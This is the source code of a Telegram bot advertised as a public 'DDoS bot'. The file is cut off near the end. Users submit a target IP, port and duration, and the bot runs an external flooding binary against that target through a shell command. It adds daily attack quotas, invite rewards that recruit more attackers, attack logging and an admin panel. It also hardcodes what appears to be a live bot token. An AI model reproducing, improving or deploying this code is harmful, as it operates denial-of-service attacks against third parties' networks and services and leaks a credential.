import telebot
import subprocess
import datetime
import os
from telebot import types
import time
import re
from threading import Lock
import sqlite3

# Bot configuration
bot = telebot.TeleBot('8012969135:AAEOvqxJfRqr_iU_KMtVjIyKH9GRt7bwBo4')
admin_id = {"8167507955"}  # Add more admin IDs as needed
DB_FILE = "maut_bot.db"
LOG_FILE = "attack_logs.txt"
COOLDOWN_TIME = 300  # 5 minutes
MAX_ATTACK_TIME = 120  # 2 minutes
MAX_DAILY_ATTACKS = 10  # 10 attacks per day
ATTACKS_PER_INVITE = 2  # 2 bonus attacks per invite
IMAGE_URL = "https://t.me/gggkkkggggiii/11"
CHANNEL_ID = -1002440538814  # Channel ID to check membership
CHANNEL_LINK = "https://t.me/+R4ram7JA-yY4MWQ1"  # Channel invite link

# Initialize database
def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    # Create users table
    cursor.execute('''CREATE TABLE IF NOT EXISTS users 
                     (user_id TEXT PRIMARY KEY, 
                      username TEXT,
                      first_name TEXT,
                      last_name TEXT,
                      attacks_today INTEGER DEFAULT 0, 
                      last_attack_date TEXT,
                      total_attacks INTEGER DEFAULT 0,
                      invites INTEGER DEFAULT 0,
                      is_banned BOOLEAN DEFAULT FALSE,
                      join_date TEXT,
                      last_active TEXT)''')
    
    # Create cooldown table
    cursor.execute('''CREATE TABLE IF NOT EXISTS cooldown 
                     (user_id TEXT PRIMARY KEY, 
                      cooldown_end TEXT)''')
    
    # Create active_attacks table
    cursor.execute('''CREATE TABLE IF NOT EXISTS active_attacks 
                     (user_id TEXT PRIMARY KEY,
                      start_time TEXT,
                      duration INTEGER,
                      target_ip TEXT,
                      target_port INTEGER)''')
    
    # Create referrals table
    cursor.execute('''CREATE TABLE IF NOT EXISTS referrals
                     (referrer_id TEXT,
                      referred_id TEXT,
                      PRIMARY KEY (referrer_id, referred_id))''')
    
    conn.commit()
    conn.close()

# Database helper functions
def db_execute(query, params=(), fetch=False):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute(query, params)
    if fetch:
        result = cursor.fetchall()
    else:
        result = None
    conn.commit()
    conn.close()
    return result

def get_user(user_id):
    result = db_execute("SELECT * FROM users WHERE user_id=?", (user_id,), fetch=True)
    return result[0] if result else None

def create_user(user_id, username=None, first_name=None, last_name=None):
    existing = get_user(user_id)
    if not existing:
        db_execute('''INSERT INTO users 
                     (user_id, username, first_name, last_name, attacks_today, last_attack_date, join_date, last_active) 
                     VALUES (?, ?, ?, ?, 0, ?, ?, ?)''', 
                  (user_id, username, first_name, last_name, 
                   datetime.date.today().isoformat(), 
                   datetime.datetime.now().isoformat(),
                   datetime.datetime.now().isoformat()))
    else:
        # Update user info if already exists
        db_execute('''UPDATE users SET 
                     username = ?,
                     first_name = ?,
                     last_name = ?,
                     last_active = ?
                     WHERE user_id = ?''',
                  (username, first_name, last_name, 
                   datetime.datetime.now().isoformat(), 
                   user_id))

def update_user_activity(user_id):
    db_execute("UPDATE users SET last_active = ? WHERE user_id = ?",
              (datetime.datetime.now().isoformat(), user_id))

def log_attack(user_id, target, port, time):
    try:
        user = bot.get_chat(user_id)
        username = f"@{user.username}" if user.username else f"ID:{user_id}"
        with open(LOG_FILE, "a") as f:
            f.write(f"{datetime.datetime.now()} | {username} | {target}:{port} | {time}s\n")
    except Exception as e:
        print(f"Logging error: {e}")

def parse_time_input(time_str):
    time_str = time_str.lower()
    total_seconds = 0
    
    matches = re.findall(r'(\d+)\s*(day|hour|min|sec|d|h|m|s)', time_str)
    
    for amount, unit in matches:
        amount = int(amount)
        if unit in ['day', 'd']:
            total_seconds += amount * 86400
        elif unit in ['hour', 'h']:
            total_seconds += amount * 3600
        elif unit in ['min', 'm']:
            total_seconds += amount * 60
        elif unit in ['sec', 's']:
            total_seconds += amount
    
    return total_seconds if total_seconds > 0 else None

def is_attack_active():
    result = db_execute("SELECT COUNT(*) FROM active_attacks", fetch=True)
    return result[0][0] > 0 if result else False

def add_active_attack(user_id, attack_time, ip, port):
    db_execute("INSERT INTO active_attacks (user_id, start_time, duration, target_ip, target_port) VALUES (?, ?, ?, ?, ?)",
               (user_id, datetime.datetime.now().isoformat(), attack_time, ip, port))

def remove_active_attack(user_id):
    db_execute("DELETE FROM active_attacks WHERE user_id=?", (user_id,))

def get_active_attack_info():
    result = db_execute("SELECT user_id, start_time, duration, target_ip, target_port FROM active_attacks LIMIT 1", fetch=True)
    if not result:
        return None
    
    user_id, start_time_str, duration, target_ip, target_port = result[0]
    start_time = datetime.datetime.fromisoformat(start_time_str)
    elapsed = (datetime.datetime.now() - start_time).seconds
    remaining = max(0, duration - elapsed)
    return user_id, remaining, target_ip, target_port

def get_user_attack_count(user_id):
    user = get_user(user_id)
    if not user:
        return 0
    
    # Reset daily count if it's a new day
    today = datetime.date.today().isoformat()
    if user[5] != today:
        db_execute("UPDATE users SET attacks_today=0, last_attack_date=? WHERE user_id=?", 
                  (today, user_id))
        return 0
    
    return user[4]

def increment_attack_count(user_id):
    today = datetime.date.today().isoformat()
    db_execute('''UPDATE users 
                 SET attacks_today = attacks_today + 1, 
                     last_attack_date = ?,
                     total_attacks = total_attacks + 1
                 WHERE user_id=?''', 
              (today, user_id))

def set_cooldown(user_id):
    cooldown_end = (datetime.datetime.now() + datetime.timedelta(seconds=COOLDOWN_TIME)).isoformat()
    db_execute("INSERT OR REPLACE INTO cooldown (user_id, cooldown_end) VALUES (?, ?)", 
               (user_id, cooldown_end))

def is_on_cooldown(user_id):
    result = db_execute("SELECT cooldown_end FROM cooldown WHERE user_id=?", (user_id,), fetch=True)
    if not result:
        return False
    
    cooldown_end = datetime.datetime.fromisoformat(result[0][0])
    return datetime.datetime.now() < cooldown_end

def get_cooldown_remaining(user_id):
    result = db_execute("SELECT cooldown_end FROM cooldown WHERE user_id=?", (user_id,), fetch=True)
    if not result:
        return 0
    
    cooldown_end = datetime.datetime.fromisoformat(result[0][0])
    remaining = (cooldown_end - datetime.datetime.now()).seconds
    return max(0, remaining)

def add_referral(referrer_id, referred_id):
    try:
        # Check if this is a valid new referral
        if referrer_id == referred_id:
            return False
            
        # Check if this referral already exists
        existing = db_execute("SELECT 1 FROM referrals WHERE referrer_id=? AND referred_id=?", 
                            (referrer_id, referred_id), fetch=True)
        if existing:
            return False
            
        # Create both users if they don't exist
        create_user(referrer_id)
        create_user(referred_id)
        
        # Add the referral record
        db_execute("INSERT INTO referrals (referrer_id, referred_id) VALUES (?, ?)", 
                  (referrer_id, referred_id))
        
        # Give bonus to referrer
        db_execute("UPDATE users SET invites = invites + 1, attacks_today = attacks_today + ? WHERE user_id=?", 
                  (ATTACKS_PER_INVITE, referrer_id))
        
        # Give bonus to referred user
        db_execute("UPDATE users SET attacks_today = attacks_today + ? WHERE user_id=?", 
                  (ATTACKS_PER_INVITE, referred_id))
        
        return True
    except Exception as e:
        print(f"Referral error: {e}")
        return False

def get_user_stats(user_id):
    user = get_user(user_id)
    if not user:
        return None
    
    today = datetime.date.today().isoformat()
    attacks_remaining = max(0, MAX_DAILY_ATTACKS - user[4]) if user[5] == today else MAX_DAILY_ATTACKS
    invites = user[7]
    
    return {
        'username': user[1],
        'first_name': user[2],
        'last_name': user[3],
        'attacks_today': user[4],
        'attacks_remaining': attacks_remaining,
        'total_attacks': user[6],
        'invites': invites,
        'bonus_attacks': invites * ATTACKS_PER_INVITE,
        'is_banned': user[8],
        'join_date': user[9],
        'last_active': user[10]
    }

def check_channel_membership(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_ID, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        print(f"Error checking channel membership: {e}")
        return False

def send_channel_join_message(chat_id):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Join Channel", url=CHANNEL_LINK))
    markup.add(types.InlineKeyboardButton("✅ I've Joined", callback_data="check_join"))
    
    bot.send_message(
        chat_id,
        "⚠️ You must join our channel to use this bot:\n\n"
        f"{CHANNEL_LINK}\n\n"
        "After joining, click the button below to verify.",
        reply_markup=markup
    )

def check_membership_wrapper(func):
    def wrapped(message):
        user_id = str(message.chat.id)
        if not check_channel_membership(user_id):
            send_channel_join_message(message.chat.id)
            return
        return func(message)
    return wrapped

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = str(message.chat.id)
    username = message.from_user.username
    first_name = message.from_user.first_name
    last_name = message.from_user.last_name
    
    create_user(user_id, username, first_name, last_name)
    
    # Always check channel membership first
    if not check_channel_membership(user_id):
        send_channel_join_message(message.chat.id)
        return
    
    # Check for referral
    referral_success = False
    if len(message.text.split()) > 1:
        referrer_id = message.text.split()[1]
        if referrer_id.isdigit() and referrer_id != user_id:
            referral_success = add_referral(referrer_id, user_id)
    
    caption = """
🚀 *Welcome to MAUT DDoS Bot* 🚀

*Public Access Features:*
- 10 free attacks per day
- +2 attacks for each friend you invite
- +2 attacks when you join via invite link

*Available Commands:*
/maut <ip> <port> <time> - Start attack
/mystats - Check your stats
/invite - Get your invite link
/mylogs - View your attack history
/help - Show all commands
/rules - Usage guidelines

⚡ *Example Attack:*
`/maut 1.1.1.1 80 60`
"""
    
    if referral_success:
        caption += "\n🎉 You received +2 bonus attacks for joining via invite link!"
    
    try:
        bot.send_photo(
            chat_id=message.chat.id,
            photo=IMAGE_URL,
            caption=caption,
            parse_mode="Markdown"
        )
    except Exception as e:
        bot.reply_to(message, caption, parse_mode="Markdown")
        print(f"Error sending image: {e}")

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def check_join_callback(call):
    user_id = str(call.from_user.id)
    
    if check_channel_membership(user_id):
        bot.answer_callback_query(call.id, "✅ Verification successful!")
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start_command(call.message)  # Show start message
    else:
        bot.answer_callback_query(call.id, "❌ You haven't joined the channel yet!", show_alert=True)

@bot.message_handler(commands=['maut'])
@check_membership_wrapper
def handle_attack_command(message):
    user_id = str(message.chat.id)
    username = message.from_user.username
    first_name = message.from_user.first_name
    last_name = message.from_user.last_name
    
    create_user(user_id, username, first_name, last_name)
    
    # Check if user is banned
    user = get_user(user_id)
    if user and user[8]:  # is_banned field
        return bot.reply_to(message, "❌ You are banned from using this bot.")
    
    # Check if another attack is active
    active_info = get_active_attack_info()
    if active_info:
        active_user_id, remaining, target_ip, target_port = active_info
        try:
            active_user = bot.get_chat(active_user_id)
            username = f"@{active_user.username}" if active_user.username else f"ID:{active_user_id}"
            return bot.reply_to(message, f"⚠️ Attack in progress by {username} on {target_ip}:{target_port}. Please wait {remaining} seconds.")
        except:
            return bot.reply_to(message, f"⚠️ Attack in progress. Please wait {remaining} seconds.")
    
    # Check cooldown
    if is_on_cooldown(user_id):
        remaining = get_cooldown_remaining(user_id)
        return bot.reply_to(message, f"⏳ Cooldown active. Wait {remaining} seconds.")
    
    # Check daily attack limit
    stats = get_user_stats(user_id)
    if stats['attacks_remaining'] <= 0:
        return bot.reply_to(message, f"❌ Daily limit reached (10 attacks). Invite friends for more attacks (/invite).")
    
    # Parse command
    try:
        args = message.text.split()
        if len(args) != 4:
            return bot.reply_to(message, "❌ Usage: /maut <ip> <port> <time>\nExample: /maut 1.1.1.1 80 60")
        
        ip = args[1]
        port = args[2]
        attack_time = args[3]
        
        # Validate IP
        if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
            return bot.reply_to(message, "❌ Invalid IP format. Example: 1.1.1.1")
        
        # Validate port
        if not port.isdigit() or not 1 <= int(port) <= 65535:
            return bot.reply_to(message, "❌ Invalid port (1-65535)")
        
        # Validate time
        if not attack_time.isdigit() or not 1 <= int(attack_time) <= MAX_ATTACK_TIME:
            return bot.reply_to(message, f"❌ Invalid time (1-{MAX_ATTACK_TIME}s)")
        
        # Show confirmation
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("✅ Start Attack", callback_data=f"start_attack|{ip}|{port}|{attack_time}"))
        
        bot.send_message(
            message.chat.id,
            f"⚡ *Attack Summary:*\n\n"
            f"🌐 IP: `{ip}`\n"
            f"🔌 Port: `{port}`\n"
            f"⏱ Time: `{attack_time}`s\n"
            f"📊 Attacks left today: {stats['attacks_remaining']-1}\n\n"
            f"Click below to confirm attack:",
            parse_mode="Markdown",
            reply_markup=markup
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.callback_query_handler(func=lambda call: True)
def handle_buttons(call):
    user_id = str(call.from_user.id)
    
    # First check channel membership for all callbacks
    if not check_channel_membership(user_id):
        bot.answer_callback_query(call.id, "❌ Please join our channel first!", show_alert=True)
        send_channel_join_message(call.message.chat.id)
        return
    
    if call.data.startswith("start_attack"):
        _, ip, port, attack_time = call.data.split("|")
        
        try:
            # Mark attack as active
            add_active_attack(user_id, int(attack_time), ip, int(port))
            
            # Execute attack
            subprocess.Popen(f"./maut {ip} {port} {attack_time} 900", shell=True)
            log_attack(user_id, ip, port, attack_time)
            set_cooldown(user_id)
            increment_attack_count(user_id)
            
            # Update message
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"🔥 *Attack Launched!* 🔥\n\n"
                     f"🌐 Target: `{ip}`\n"
                     f"🔌 Port: `{port}`\n"
                     f"⏱ Duration: `{attack_time}`s\n"
                     f"📊 Attacks left today: {get_user_stats(user_id)['attacks_remaining']}\n\n"
                     f"[⚡ Powered by @seedhe_maut_bot](https://t.me/seedhe_maut_bot)",
                parse_mode="Markdown"
            )
            
            # Schedule attack completion message
            attack_duration = int(attack_time)
            time.sleep(attack_duration)
            
            # Send completion message
            bot.send_message(
                call.message.chat.id,
                f"✅ *Attack Completed!*\n\n"
                f"🌐 Target: `{ip}`\n"
                f"⏱ Duration: `{attack_time}`s\n\n"
                f"Cooldown: {COOLDOWN_TIME//60} minutes",
                parse_mode="Markdown"
            )
            
            # Remove from active attacks
            remove_active_attack(user_id)
            
            # Add new attack button
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("⚡ New Attack", callback_data="new_attack"))
            bot.send_message(call.message.chat.id, "Attack finished! You can launch a new one when cooldown ends.", reply_markup=markup)
            
        except Exception as e:
            remove_active_attack(user_id)
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"❌ Error: {str(e)}"
            )
    
    elif call.data == "new_attack":
        if is_on_cooldown(user_id):
            remaining = get_cooldown_remaining(user_id)
            return bot.answer_callback_query(call.id, f"⏳ Wait {remaining} seconds")
        
        bot.send_message(call.message.chat.id, "⚡ Send new attack command:\n`/maut <ip> <port> <time>`", parse_mode="Markdown")
    
    elif call.data.startswith("admin_"):
        handle_admin_buttons(call)
    
    bot.answer_callback_query(call.id)

@bot.message_handler(commands=['mystats'])
@check_membership_wrapper
def show_stats(message):
    user_id = str(message.chat.id)
    create_user(user_id)
    
    stats = get_user_stats(user_id)
    if not stats:
        return bot.reply_to(message, "❌ Error getting stats.")
    
    response = f"""
📊 *Your Stats* 📊

• Attacks today: {stats['attacks_today']}/{MAX_DAILY_ATTACKS + stats['bonus_attacks']}
• Attacks remaining: {stats['attacks_remaining']}
• Total attacks: {stats['total_attacks']}
• Friends invited: {stats['invites']}
• Bonus attacks earned: {stats['bonus_attacks']}

Use /invite to get more attacks!
"""
    bot.reply_to(message, response, parse_mode="Markdown")

@bot.message_handler(commands=['invite'])
@check_membership_wrapper
def invite_command(message):
    user_id = str(message.chat.id)
    create_user(user_id)
    
    bot_name = bot.get_me().username
    invite_link = f"https://t.me/{bot_name}?start={user_id}"
    
    stats = get_user_stats(user_id)
    
    response = f"""
📨 *Invite Friends & Earn Attacks* 📨

🔗 Your invite link:
{invite_link}

💎 For each friend who joins using your link:
• You get +{ATTACKS_PER_INVITE} attacks
• They get +{ATTACKS_PER_INVITE} attacks

📊 You've invited {stats['invites']} friends and earned {stats['bonus_attacks']} bonus attacks!
"""
    bot.reply_to(message, response, parse_mode="Markdown")

@bot.message_handler(commands=['mylogs'])
@check_membership_wrapper
def my_logs(message):
    user_id = str(message.chat.id)
    
    if not os.path.exists(LOG_FILE):
        return bot.reply_to(message, "ℹ️ No attack history.")
    
    user_logs = []
    with open(LOG_FILE, "r") as f:
        for line in f:
            if str(user_id) in line or (message.from_user.username and f"@{message.from_user.username}" in line):
                user_logs.append(line)
    
    if not user_logs:
        return bot.reply_to(message, "ℹ️ No attacks found in your history.")
    
    bot.reply_to(message, f"📜 Your Attack History (last 10):\n\n" + "".join(user_logs[-10:]))

@bot.message_handler(commands=['help'])
@check_membership_wrapper
def help_command(message):
    help_text = """
🛠 *MAUT Bot Help* 🛠

*Public Commands:*
/maut <ip> <port> <time> - Start attack
/mystats - Check your stats
/invite - Get invite link
/mylogs - View your history
/rules - Usage guidelines

⚡ *Example Attack:*
`/maut 1.1.1.1 80 60`
"""
    bot.reply_to(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['rules'])
@check_membership_wrapper
def rules_command(message):
    rules = """
📜 *Usage Rules* 📜

1. Max attack time: 240 seconds
2. 10 attacks per day (earn more by inviting friends)
3. 5 minutes cooldown between attacks
4. No concurrent attacks
5. No illegal targets

Violations will result in ban.
"""
    bot.reply_to(message, rules, parse_mode="Markdown")

# =============================================
# Enhanced Admin Commands
# =============================================

def is_admin(user_id):
    return str(user_id) in admin_id

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📊 Stats", callback_data="admin_stats"),
        types.InlineKeyboardButton("👥 Users", callback_data="admin_users"),
        types.InlineKeyboardButton("⚡ Active Attack", callback_data="admin_active"),
        types.InlineKeyboardButton("🔍 Search User", callback_data="admin_search"),
        types.InlineKeyboardButton("⛔ Ban User", callback_data="admin_ban"),
        types.InlineKeyboardButton("✅ Unban User", callback_data="admin_unban"),
        types.InlineKeyboardButton("📜 Logs", callback_data="admin_logs"),
        types.InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")
    )
    
    bot.send_message(
        message.chat.id,
        "👑 *Admin Panel* 👑\n\nSelect an option:",
        parse_mode="Markdown",
        reply_markup=markup
    )

def handle_admin_buttons(call):
    user_id = str(call.from_user.id)
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "❌ Unauthorized!")
        return
    
    if call.data == "admin_stats":
        # Get comprehensive stats
        total_users = db_execute("SELECT COUNT(*) FROM users", fetch=True)[0][0]
        active_users = db_execute("SELECT COUNT(*) FROM users WHERE last_active > datetime('now', '-7 days')", fetch=True)[0][0]
        today_attacks = db_execute("SELECT SUM(attacks_today) FROM users WHERE last_attack_date=?", 
                                 (datetime.date.today().isoformat(),), fetch=True)[0][0] or 0
        total_attacks = db_execute("SELECT SUM(total_attacks) FROM users", fetch=True)[0][0] or 0
        total_referrals = db_execute("SELECT COUNT(*) FROM referrals", fetch=True)[0][0]
        banned_users = db_execute("SELECT COUNT(*) FROM users WHERE is_banned=1", fetch=True)[0][0]
        
        active_attack = get_active_attack_info()
        attack_info = ""
        if active_attack:
            attacker_id, remaining, target_ip, target_port = active_attack
            try:
                attacker = bot.get_chat(attacker_id)
                attacker_name = f"@{attacker.username}" if attacker.username else f"ID:{attacker_id}"
            except:
                attacker_name = f"ID:{attacker_id}"
            attack_info = f"\n\n🔥 *Active Attack:*\n- By: {attacker_name}\n- Target: {target_ip}:{target_port}\n- Time left: {remaining}s"
        
        response = f"""
📈 *Admin Statistics* 📈

👥 Users:
- Total: {total_users}
- Active (7d): {active_users}
- Banned: {banned_users}

⚡ Attacks:
- Today: {today_attacks}
- Total: {total_attacks}

📨 Referrals:
- Total: {total_referrals}
{attack_info}
"""
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="admin_back"))
        
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=response,
            parse_mode="Markdown",
            reply_markup=markup
        )
    
    elif call.data == "admin_users":
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("🆕 New Users (7d)", callback_data="admin_new_users"),
            types.InlineKeyboardButton("💎 Top Users", callback_data="admin_top_users"),
            types.InlineKeyboardButton("🔙 Back", callback_data="admin_back")
        )
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="👥 *User Management* 👥\n\nSelect an option:",
            parse_mode="Markdown",
            reply_markup=markup
        )
    
    elif call.data == "admin_new_users":
        users = db_execute("SELECT user_id, username, first_name, last_name, join_date FROM users WHERE join_date > datetime('now', '-7 days') ORDER BY join_date DESC LIMIT 10", fetch=True)
        
        if not users:
            bot.answer_callback_query(call.id, "No new users in last 7 days")
            return
        
        response = "🆕 *New Users (Last 7 Days)* 🆕\n\n"
        for idx, user in enumerate(users, 1):
            user_id, username, first_name, last_name, join_date = user
            name = f"{first_name} {last_name}" if last_name else first_name
            username = f" @{username}" if username else ""
            join_date = datetime.datetime.fromisoformat(join_date).strftime("%Y-%m-%d")
            response += f"{idx}. [{name}](tg://user?id={user_id}){username} - {join_date}\n"
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="admin_users"))
        
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=response,
            parse_mode="Markdown",
            reply_markup=markup,
            disable_web_page_preview=True
        )
    
    elif call.data == "admin_top_users":
        users = db_execute("SELECT user_id, username, first_name, last_name, total_attacks FROM users ORDER BY total_attacks DESC LIMIT 10", fetch=True)
        
        response = "🏆 *Top Users by Attacks* 🏆\n\n"
        for idx, user in enumerate(users, 1):
            user_id, username, first_name, last_name, total_attacks = user
            name = f"{first_name} {last_name}" if last_name else first_name
            username = f" @{username}" if username else ""
            response += f"{idx}. [{name}](tg://user?id={user_id}){username} - {total_attacks} attacks\n"
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="admin_users"))
        
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=response,
            parse_mode="Markdown",
            reply_markup=markup,
            disable_web_page_preview=True
        )
    
    elif call.data == "admin_active":
        active_attack = get_active_attack_info()
        if not active_attack:
            bot.answer_callback_query(call.id, "No active attack")
            return
        
        attacker_id, remaining, target_ip, target_port = active_attack
        try:
            attacker = bot.get_chat(attacker_id)
            attacker_name = f"@{attacker.username}" if attacker.username else f"ID:{attacker_id}"
        except:
            attacker_name = f"ID:{attacker_id}"
        
        response = f"""
🔥 *Active Attack Details* 🔥

👤 Attacker: [{attacker_name}](tg://user?id={attacker_id})
🎯 Target: `{target_ip}:{target_port}`
⏱ Time left: {remaining}s
"""
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("🛑 Stop Attack", callback_data=f"admin_stop_attack|{attacker_id}"),
            types.InlineKeyboardButton("🔙 Back", callback_data="admin_back")
        )
        
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=response,
            parse_mode="Markdown",
            reply_markup=markup
        )
    
    elif call.data.startswith("admin_stop_attack"):
        _, attacker_id = call.data.split("|")
        
        # Stop the attack
        remove_active_attack(attacker_id)
        
        # Notify admin
        bot.answer_callback_query(call.id, "✅ Attack stopped")
        
        # Notify attacker if possible
        try:
            bot.send_message(
                attacker_id,
                "⚠️ Your attack was stopped by admin!"
            )
        except:
            pass
        
        # Return to admin panel
        admin_panel(call.message)
    
    elif call.data == "admin_search":
        msg = bot.send_message(
            call.message.chat.id,
            "🔍 Enter user ID or username (without @) to search:"
        )
        bot.register_next_step_handler(msg, process_admin_search)
    
    elif call.data == "admin_ban":
        msg = bot.send_message(
            call.message.chat.id,
            "⛔ Enter user ID or username (without @) to ban:"
        )
        bot.register_next_step_handler(msg, process_admin_ban)
    
    elif call.data == "admin_unban":
        msg = bot.send_message(
            call.message.chat.id,
            "✅ Enter user ID or username (without @) to unban:"
        )
        bot.register_next_step_handler(msg, process_admin_unban)
    
    elif call.data == "admin_logs":
        if not os.path.exists(LOG_FILE):
            bot.answer_callback_query(call.id, "No logs available")
            return
        
        with open(LOG_FILE, "rb") as f:
            bot.send_document(
                call.message.chat.id,
                f,
                caption="📜 Attack Logs"
            )
    
    elif call.data == "admin_broadcast":
        msg = bot.send_message(
            call.message.chat.id,
            "📢 Enter broadcast message (supports Markdown):"
        )
        bot.register_next_step_handler(msg, process_admin_broadcast)
    
    elif call.data == "admin_back":
        admin_panel(call.message)
    
    bot.answer_callback_query(call.id)

def process_admin_search(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        return
    
    search_term = message.text.strip()
    
    # Try to find user by ID
    if search_term.isdigit():
        user = get_user(search_term)
        if user:
            show_user_info(message, user)
            return
    
    # Try to find user by username (with or without @)
    username = search_term.lstrip('@')
    users = db_execute("SELECT * FROM users WHERE username=?", (username,), fetch=True)
    
    if users:
        show_user_info(message, users[0])
    else:
        bot.reply_to(message, "❌ User not found")

def show_user_info(message, user):
    user_id, username, first_name, last_name, attacks_today, last_attack_date, total_attacks, invites, is_banned, join_date, last_active = user
    
    name = f"{first_name} {last_name}" if last_name else first_name
    username = f"@{username}" if username else "None"
    join_date = datetime.datetime.fromisoformat(join_date).strftime("%Y-%m-%d %H:%M")
    last_active = datetime.datetime.fromisoformat(last_active).strftime("%Y-%m-%d %H:%M")
    status = "⛔ Banned" if is_banned else "✅ Active"
    
    response = f"""
👤 *User Information* 👤

🆔 ID: `{user_id}`
👀 Name: [{name}](tg://user?id={user_id})
📛 Username: {username}
📅 Joined: {join_date}
⏳ Last Active: {last_active}
🔰 Status: {status}

⚡ *Attack Stats* ⚡
• Today: {attacks_today}
• Total: {total_attacks}
• Invites: {invites}
"""
    markup = types.InlineKeyboardMarkup()
    if is_banned:
        markup.add(types.InlineKeyboardButton("✅ Unban", callback_data=f"admin_do_unban|{user_id}"))
    else:
        markup.add(types.InlineKeyboardButton("⛔ Ban", callback_data=f"admin_do_ban|{user_id}"))
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="admin_back"))
    
    bot.send_message(
        message.chat.id,
        response,
        parse_mode="Markdown",
        reply_markup=markup,
        disable_web_page_preview=True
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith(('admin_do_ban', 'admin_do_unban')))
def handle_admin_actions(call):
    user_id = str(call.from_user.id)
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "❌ Unauthorized!")
        return
    
    action, target_id = call.data.split("|")
    
    if action == "admin_do_ban":
        db_execute("UPDATE users SET is_banned=1 WHERE user_id=?", (target_id,))
        bot.answer_callback_query(call.id, "✅ User banned")
        
        # Notify user if possible
        try:
            bot.send_message(
                target_id,
                "⛔ You have been banned from using this bot."
            )
        except:
            pass
    
    elif action == "admin_do_unban":
        db_execute("UPDATE users SET is_banned=0 WHERE user_id=?", (target_id,))
        bot.answer_callback_query(call.id, "✅ User unbanned")
        
        # Notify user if possible
        try:
            bot.send_message(
                target_id,
                "✅ Your ban has been lifted. You can now use the bot again."
            )
        except:
            pass
    
    # Update the message
    user = get_user(target_id)
    if user:
        show_user_info(call.message, user)

def process_admin_ban(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        return
    
    search_term = message.text.strip()
    
    # Try to find user by ID
    if search_term.isdigit():
        db_execute("UPDATE users SET is_banned=1 WHERE user_id=?", (search_term,))
        bot.reply_to(message, f"✅ User {search_term} banned")
        
        # Notify user if possible
        try:
            bot.send_message(
                search_term,
                "⛔ You have been banned from using this bot."
            )
        except:
            pass
        return
    
    # Try to find user by username (with or without @)
    username = search_term.lstrip('@')
    users = db_execute("SELECT user_id FROM users WHERE username=?", (username,), fetch=True)
    
    if users:
        target_id = users[0][0]
        db_execute("UPDATE users SET is_banned=1 WHERE user_id=?", (target_id,))
        bot.reply_to(message, f"✅ User @{username} banned")
        
        # Notify user if possible
        try:
            bot.send_message(
                target_id,
                "⛔ You have been banned from using this bot."
            )
        except:
            pass
    else:
        bot.reply_to(message, "❌ User not found")

def process_admin_unban(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        return
    
    search_term = message.text.strip()
    
    # Try to find user by ID
    if search_term.isdigit():
        db_execute("UPDATE users SET is_banned=0 WHERE user_id=?", (search_term,))
        bot.reply_to(message, f"✅ User {search_term} unbanned")
        
        # Notify user if possible
        try:
            bot.send_message(
                search_term,
                "✅ Your ban has been lifted. You can now use the bot again."
            )
        except:
            pass
        return
    
    # Try to find user by username (with or without @)
    username = search_term.lstrip('@')
    users = db_execute("SELECT user_id FROM users WHERE username=?", (username,), fetch=True)
    
    if users:
        target_id = users[0][0]
        db_execute("UPDATE users SET is_banned=0 WHERE user_id=?", (target_id,))
        bot.reply_to(message, f"✅ User @{username} unbanned")
        
        # Notify user if possible
        try:
            bot.send_message(
                target_id,
                "✅ Your ban has been lifted. You can now use the bot again."
            )
        except:
            pass
    else:
        bot.reply_to(message, "❌ User not found")

def process_admin_broadcast(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        return
    
    broadcast_text = message.text
    
    # Get all users
    users = db_execute("SELECT user_id FROM users", fetch=True)
    total = len(users)
    success = 0
    
    progress_msg = bot.reply_to(message, f"📢 Broadcasting to {total} users... (0/{total})")
    
    for idx, (target_id,) in enumerate(users, 1):
        try:
            bot.send_message(
                target_id,
                broadcast_text,
                parse_mode="Markdown"
            )
            success += 1
        except Exception as e:
            print(f"Failed to send to {target_id}: {e}")
        
        # Update progress every 10 messages
        if idx % 10 == 0 or idx == total:
            try:
                bot.edit_message_text(
